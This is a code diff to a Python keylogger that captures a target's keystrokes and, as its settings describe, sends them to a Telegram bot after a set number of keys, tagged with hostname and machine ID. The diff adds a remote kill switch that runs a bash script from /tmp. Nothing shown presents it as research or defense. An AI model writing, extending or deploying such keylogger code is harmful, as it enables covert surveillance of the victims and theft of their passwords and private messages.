@@ -6,6 +6,7 @@ import struct
 import sys
 import time
 import threading
+import subprocess
 
 from telegramUtils import initChatID
 from telegramUtils import sendFromBuffer
@@ -16,13 +17,15 @@ wantSHIFT = 0       #do you want in the logs [SHIFT] when target press shift    
 debugging = 1       #get extra comments                                         (1/0)
 enableLocalKillSwitch = 1                                                     # (1/0)
 threshold = 20      #how many keys after sendinf the text to the telegram bot   (int)
-
+pathKiller = "/tmp/killSwitch.sh"
 hostname = socket.gethostname()
 machine_id = uuid.getnode()
 EVENT_FORMAT = 'llHHI'
 EVENT_SIZE   = struct.calcsize(EVENT_FORMAT)
 
 kill_flag = threading.Event()
+
+sleepFlag = 0
 
 
 KEYMAP = {
@@ -182,8 +185,9 @@ def chechRemoteKillSwitch():
             if debugging:
                 print("command /kill got")
             kill_flag.set()
+            subprocess.run(["bash", pathKiller])
             return
-        time.sleep(1)  # evita busy‑loop
+        time.sleep(1)
 
 # MAIN
 
